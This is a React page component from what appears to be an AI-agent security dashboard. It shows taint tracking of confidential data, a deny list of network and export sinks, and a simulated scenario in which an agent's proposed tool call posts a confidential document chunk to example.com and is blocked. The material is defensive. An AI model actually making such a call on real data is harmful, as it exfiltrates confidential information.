import { useState } from 'react';
import { ArrowDown, Bot, Database, FileText, Globe, Layers, Mail, Navigation, Save, Server, User, Zap, Activity } from 'lucide-react';
import { Card, ClassPill, Page, PageHeader, Pill, TrustPill } from '../components/common';
import { ScenarioModal } from '../components/dashboard/ScenarioModal';
import { securityService } from '../services';
import { useConsole } from '../state/ConsoleContext';
import type { TrustLabel } from '../types';

const SINKS = [
  { icon: <Mail />, name: 'send_email', status: 'BLOCKED', note: 'Prohibited: Air-gap policy POL-001 completely denies SMTP' },
  { icon: <Globe />, name: 'http_post / fetch', status: 'BLOCKED', note: 'Prohibited: Tainted confidential tokens cannot leave localhost' },
  { icon: <Navigation />, name: 'network_request', status: 'BLOCKED', note: 'Prohibited: Raw socket creation blocked by Air-Gap kernel rule' },
  { icon: <Save />, name: 'write_file', status: 'RESTRICTED', note: 'Restricted: Sandbox write only allowed to /sandbox/workspace' },
  { icon: <Server />, name: 'database_export', status: 'BLOCKED', note: 'Prohibited: Memory dump / export requires human SOC authorization' },
];
const TAXONOMY: { label: TrustLabel; level: string; origin: string; policy: string }[] = [
  { label: 'SYSTEM', level: 'High', origin: 'Internal harness supervisory prompts & hardcoded constraints', policy: 'Safe to all internal sinks' },
  { label: 'LOCAL_DOCUMENT', level: 'Medium', origin: 'Local files ingested into RAG; retains source classification tag', policy: 'Taints downstream context with source clearance' },
  { label: 'RETRIEVED_DATA', level: 'Medium', origin: 'Extracted vector database chunks loaded into LLM context window', policy: 'Marks agent RAM buffer with source confidentiality' },
  { label: 'USER', level: 'Untrusted', origin: 'Raw operator prompts; sanitized by AST scanner before processing', policy: 'Requires policy review if triggering tool requests' },
  { label: 'TOOL_OUTPUT', level: 'Variable', origin: 'Outputs returned by local tools (Calculator, DB, File System)', policy: 'Inherits tool capability trust clearance' },
  { label: 'UNTRUSTED', level: 'Zero', origin: 'External content, adversarial payloads, or unauthorized sockets', policy: 'STRICTLY PROHIBITED from entering sensitive sinks' },
];

export default function Taint() {
  const { refreshCounts, toast, settings } = useConsole();
  const [run, setRun] = useState(false);
  return (
    <Page>
      <PageHeader icon={<Activity color="#2563ff" />} title="Data / Taint Tracking & Sink Defense" subtitle="Dynamic data lineage tracking tagging every memory token from origin to outbound sink to prevent exfiltration."
        aside={settings.demoMode ? <button type="button" className="cx-btn cx-btn--pink" onClick={() => setRun(true)}><Zap />Simulate Taint Block Scenario</button> : undefined} />
      <Card title="Data taint lineage & sink enforcement graph" icon={<Layers color="#2563ff" />} aside={<Pill tone="amber" dot>TAINT PROPAGATION: ACTIVE</Pill>}>
        <p className="cx-sub">Tracking classification taint inheritance from sources through agent memory into sensitive outbound sinks.</p>

        <h3 className="tn-stage"><i style={{ background: '#10cfe0' }} />Stage 1: Data sources & trust labels</h3>
        <div className="cx-grid cx-grid--2">
          <Card flat><div className="cx-row"><FileText color="#e0a02a" /><b>financial_report.pdf</b><span className="cx-push"><ClassPill value="CONFIDENTIAL" /></span></div>
            <div className="cx-row" style={{ margin: '.5rem 0' }}><span className="cx-muted cx-mono" style={{ fontSize: '.74rem' }}>Trust Label:</span><TrustPill value="LOCAL_DOCUMENT" /></div><p className="cx-sub" style={{ margin: 0 }}>Encrypted local file containing quarterly audit metrics.</p></Card>
          <Card flat><div className="cx-row"><User color="#2563ff" /><b>User Prompt Query</b><span className="cx-push"><ClassPill value="INTERNAL" /></span></div>
            <div className="cx-row" style={{ margin: '.5rem 0' }}><span className="cx-muted cx-mono" style={{ fontSize: '.74rem' }}>Trust Label:</span><TrustPill value="USER" /></div><p className="cx-sub" style={{ margin: 0 }}>Operator request: “Summarize revenue and post metrics to example.com”</p></Card>
        </div>
        <p className="tn-arrow tone-violet"><ArrowDown width={14} height={14} />RAG Vector Retrieval (Taint Tag Transferred)</p>

        <h3 className="tn-stage"><i style={{ background: '#ffb02e' }} />Stage 2: Retrieval & agent memory ingestion</h3>
        <div className="cx-grid cx-grid--2">
          <Card flat><div className="cx-row"><Database color="#e0a02a" /><b>Retrieved Chunk #251</b><span className="cx-push"><Pill tone="amber">TAINTED</Pill></span></div>
            <div className="cx-row" style={{ margin: '.5rem 0' }}><span className="cx-muted cx-mono" style={{ fontSize: '.74rem' }}>Trust Label:</span><TrustPill value="RETRIEVED_DATA" /></div><p className="cx-sub" style={{ margin: 0 }}>Source tag inherited: CONFIDENTIAL data classification propagated into active RAM.</p></Card>
          <Card flat><div className="cx-row"><Bot color="#7c4ee0" /><b>AI Agent Memory Context</b><span className="cx-push"><Pill tone="amber">TAINTED CONTEXT</Pill></span></div>
            <div className="cx-row" style={{ margin: '.5rem 0' }}><span className="cx-muted cx-mono" style={{ fontSize: '.74rem' }}>Trust Label:</span><TrustPill value="TOOL_OUTPUT" /></div><p className="cx-sub" style={{ margin: 0 }}>Reasoning planner generates tool call: [http_post(url='example.com', body=chunk_251)]</p></Card>
        </div>
        <p className="tn-arrow tone-red"><ArrowDown width={14} height={14} />Policy Interception Gateway (POL-001 &amp; POL-005)</p>

        <h3 className="tn-stage"><i style={{ background: '#ff4d86' }} />Stage 3: Sensitive sinks (target of exfiltration)<span className="cx-push tone-red">TAINT VIOLATIONS BLOCKED</span></h3>
        <div className="cx-grid cx-grid--5">
          {SINKS.map((s) => (
            <Card key={s.name} tone={s.status === 'BLOCKED' ? 'red' : undefined} flat>
              <div className="cx-row"><span className="cx-icon-box cx-icon-box--red" style={{ width: '2rem', height: '2rem' }}>{s.icon}</span><span className="cx-push"><Pill tone={s.status === 'BLOCKED' ? 'red' : 'amber'}>{s.status}</Pill></span></div>
              <b className="cx-mono" style={{ display: 'block', margin: '.5rem 0 .1rem' }}>{s.name}</b><small className="cx-muted">Sensitive Sink</small><p className="cx-sub" style={{ margin: '.4rem 0 0', fontSize: '.7rem' }}>{s.note}</p>
            </Card>
          ))}
        </div>
      </Card>

      <Card title="Trust label lineage & propagation taxonomy" icon={<Layers color="#0a9f73" />} aside={<Pill tone="green">6 Classification Trust Tiers</Pill>} className="tn-tax">
        <div className="cx-tbl-wrap"><table className="cx-tbl">
          <thead><tr><th>Trust label</th><th>Trust level</th><th>Origin / description</th><th>Sink propagation policy</th></tr></thead>
          <tbody>{TAXONOMY.map((t) => <tr key={t.label}><td><TrustPill value={t.label} /></td><td>{t.level}</td><td>{t.origin}</td><td>{t.policy}</td></tr>)}</tbody>
        </table></div>
      </Card>

      {run && (
        <ScenarioModal title="Taint block scenario" onClose={() => setRun(false)}
          onDone={() => { securityService.taintScenario().then(() => { refreshCounts(); toast('Taint scenario recorded to the audit log (simulated).', 'blue'); }, () => undefined); }}
          steps={[
            { title: 'Source labelled', detail: 'financial_report.pdf → LOCAL_DOCUMENT / CONFIDENTIAL' },
            { title: 'Retrieval', detail: 'Chunk #251 enters agent memory; taint tag transferred.' },
            { title: 'Tool call proposed', detail: "http_post(url='example.com', body=chunk_251)" },
            { title: 'Sink check', detail: 'CONFIDENTIAL taint reaching a network sink.', blocked: true },
            { title: 'Audit', detail: 'Violation recorded; execution halted deterministically.' },
          ]} />
      )}
    </Page>
  );
}
